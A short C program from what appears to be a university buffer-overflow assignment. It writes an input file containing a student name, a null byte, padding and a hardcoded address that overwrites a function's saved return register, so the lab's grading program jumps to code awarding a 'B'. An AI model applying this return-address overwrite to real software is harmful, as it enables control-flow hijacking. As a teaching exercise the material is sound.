/*--------------------------------------------------------------------*/
/* createdataB.c                                                      */
/* Author: Joshua (Kimyung) Song, Sergei Kudriavtcev                  */
/*--------------------------------------------------------------------*/

/* File comment:
Produces a file called dataB with the student name, a nullbyte,
padding to overrun the stack, and the address of the instruction in
main to get a B, the latter of which will overwrite getName's stored
x30.
*/

#include <stdio.h>

/* Function comment:
main takes no command-line arguments and does not read from stdin or
any other input stream. It writes a sequence of bytes directly into
a file named "datB", and produces no output to stdout or stderr. The
function returns 0 on success.
*/
int main(void) {
    FILE *psFile;
    unsigned long ulAddr;
    int i;

    psFile = fopen("dataB", "w");
    fprintf(psFile, "Josh Song"); /* prints name bytes */
    putc('\0', psFile); /* prints nullbyte */

    for (i = 10; i < 48; i++) { /* prints padding to overrun stack */
        putc('A', psFile);
    }

    /* writes address of instruction in main to get a B, which will
       overwrite getName's stored return address */
    ulAddr = 0x400890;
    fwrite(&ulAddr, sizeof(unsigned long), 1, psFile);

    putc('\n', psFile); /* prints newline */
    fclose(psFile);

    return 0;
}
